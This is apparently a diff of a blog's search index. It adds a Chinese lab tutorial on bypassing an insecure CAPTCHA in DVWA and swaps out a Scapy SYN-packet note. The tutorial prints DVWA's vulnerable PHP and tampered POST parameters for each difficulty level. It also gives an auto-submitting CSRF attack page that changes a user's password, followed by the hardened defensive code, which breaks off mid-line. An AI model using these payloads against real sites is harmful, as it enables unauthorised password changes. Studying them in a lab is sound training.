class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_curr</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &amp;&amp; ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="审计-3"><a href="#审计-3" class="headerlink" title="审计"></a>审计</h2><ul>
-<li>使用<code>Anti-CSRF token</code>机制防御CSRF攻击。</li>
-<li>验证步骤合并为同一步，无需分开，使得验证环节无法绕过。</li>
-<li>要求输入修改之前的密码，攻击者无法绕过。</li>
-<li>利用<code>PDO</code>技术输入内容过滤，防止了<code>sql</code>注入。</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Randomly generate source port</span></span><br><span class="line">src_port = randint(<span class="number">1</span>,<span class="number">65535</span>)</span><br><span class="line"></span><br><span class="line">tcp_proto = TCP(sport = src_port,</span><br><span class="line">                dport = port,</span><br><span class="line">                flags = <span class="string">&quot;S&quot;</span>)</span><br><span class="line"></span><br><span class="line">pkt = ip_proto / tcp_proto</span><br></pre></td></tr></table></figure>
+<ul>
+<li>其中<code>flags</code>变量表示了<code>TCP</code>三次握手的不同状态，<code>S</code>表示<code>SYN</code>。</li>
 </ul>
 ]]></content>
       <categories>
-        <category>vuln</category>
+        <category>note</category>
       </categories>
       <tags>
-        <tag>Insecure CAPTCHA</tag>
+        <tag>Scapy</tag>
       </tags>
   </entry>
   <entry>
@@ -4244,6 +4159,91 @@
       </categories>
       <tags>
         <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Insecure CAPTCHA introduce and usage</title>
+    <url>/2022/05/17/vuln_Insecure_CAPTCHA/</url>
+    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><ul>
+<li><a href="https://baike.baidu.com/item/Captcha/9630117?fr=aladdin"><code>CAPTCHA</code></a>项目是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的<a href="https://baike.baidu.com/item/图灵测试/1701255">图灵测试</a>)的简称，是一种区分用户是计算机和人的公共全自动程序。</li>
+<li>使用<code>CAPTCHA</code>可以防止计算机恶意破解密码、刷单等，保证用户是人类(无法快速反复发送请求)。</li>
+<li>攻击者绕过<code>CAPTCHA</code>验证后，可以使用恶意脚本操控计算机反复发送请求或者在异地实现绕过验证的<code>CSRF</code>攻击。</li>
+</ul>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><ul>
+<li><code>CAPTCHA</code>漏洞利用验证机制的逻辑漏洞，下面给出验证流程。</li>
+<li><img src="https://img-blog.csdnimg.cn/img_convert/a3b170d0ddcb6627ed51ab4634c0ae3f.png" alt=""></li>
+<li>服务器使用<a href="http://api.drupalhelp.net/api/recaptcha/recaptcha--recaptchalib.php/function/recaptcha_check_answer/5.2">recaptcha_check_answer()</a>函数验证用户输入的正确性</li>
+</ul>
+<blockquote>
+<p>recaptcha_check_answer(string: $privkey, string: $remoteip, string: $challenge, string: $response, array: $extra_params = array())</p>
+</blockquote>
+<ul>
+<li><p>可以利用服务器核对验证信息这个环节，绕过<code>CAPTCHA</code>验证，完成非人类请求。</p>
+<span id="more"></span>
+</li>
+</ul>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><ul>
+<li>这里使用<code>DVWA</code>靶场完成对攻击场景的模拟。</li>
+<li>由于<code>Burp Suite</code>的代理和梯子冲突，故不打开梯子，<code>reCAPTCHA</code>无法显示(会使用方法绕过，此处不影响)。</li>
+</ul>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><ul>
+<li>这里修改密码的过程有两步，第一步是<code>CAPTCHA</code>的验证环节，第二步是将参数<code>POST</code>到后台。</li>
+<li>由于两步操作的判断是完全分开、没有联系的，于是可以忽略第一步的验证，直接提交修改申请。</li>
+<li>两个步骤对应的<code>step</code>参数不同，可以通过抓取报文并且修改<code>step</code>，来实现验证的绕过。</li>
+<li>代码没有对<code>CSRF</code>进行任何防护，可以利用<code>CSRF</code>漏洞进行攻击。</li>
+</ul>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul>
+<li>不进行验证，直接输入对密码的修改。</li>
+<li>点击<code>change</code>后，<code>step</code>本应提交为<code>1</code>，此处进行抓包修改。</li>
+<li><img src="https://img-blog.csdnimg.cn/20210123120544319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" alt=""></li>
+<li>修改之后则绕过了验证阶段，直接进行密码修改。</li>
+<li>第二种方法，同<code>CSRF</code>攻击一样，构造攻击页面。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.getElementById(&#x27;transfer&#x27;).submit()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">id</span>=<span class="string">&quot;transfer&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/DVWA-master/vulnerabilities/captcha/&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;step&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>用户点击攻击页面后自动提交请求，并跳转到修改密码的初始页面。</li>
+</ul>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Same as Low</span></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="comment">// Check to see if they did stage 1</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="variable">$_POST</span>[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123;</span><br><span class="line">    <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h3 id="审计-1"><a href="#审计-1" class="headerlink" title="审计"></a>审计</h3><ul>
+<li><code>Medium</code>级别基于<code>Low</code>的基础，在第二步判断增加了对第一步是否通过的验证，即判断参数<code>passed_captcha</code>是否为真。</li>
+<li><code>passed_captcha</code>参数是通过<code>POST</code>提交的，整个请求也是<code>POST</code>请求，故可以人为加上此参数。</li>
+</ul>
+<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ul>
+<li>同<code>Low</code>一样，直接跳过验证环节，提交请求。</li>
+<li>使用<code>Burp Suite</code>抓取包并修改报文，将步骤直接调整到第二步，第二步的验证伪造为已验证，即直接加入<code>passed_captcha</code>参数，混入<code>POST</code>的参数提交。</li>
+<li><img src="https://img-blog.csdnimg.cn/20210123120622846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" alt=""></li>
+<li><code>Forward</code>提交请求，发现完成绕过。</li>
+<li>利用<code>CSRF</code>漏洞攻击时，攻击页面需要添加一条参数提交。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passed_captcha&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Same as Medium</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="variable">$resp</span> || </span><br><span class="line">        (</span><br><span class="line">            <span class="variable">$_POST</span>[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">            &amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    )&#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="审计-2"><a href="#审计-2" class="headerlink" title="审计"></a>审计</h3><ul>
+<li><code>High</code>级别将验证流程合并，通过连续的判断将两个步骤相同的部分合并，避免了第一步验证的直接改参绕过。</li>
+<li>加入了<code>token</code>机制，有效防止<code>CSRF</code>漏洞攻击，下面不再做攻击页面。</li>
+</ul>
+<h3 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h3><ul>
+<li>看到了后端代码，发现即使不验证也有机会绕过验证，于是针对<code>g-recaptcha-response</code>和<code>HTTP_USER_AGENT</code>操作。</li>
+<li>同样不验证，直接提交请求并对相关参数进行抓包修改。</li>
+<li><img src="https://img-blog.csdnimg.cn/2021012312065438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" alt=""></li>
+<li>提交后，参数完成了伪造绕过。</li>
+</ul>
+<h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ul>
+<li>使用<code>Impossible</code>级别代码作为防御模板。</li>
+</ul>
+<h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">    <span class="variable">$pass_new</span>  = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line">    <span class="variable">$pass_conf</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_conf</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">    <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_curr</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[<span 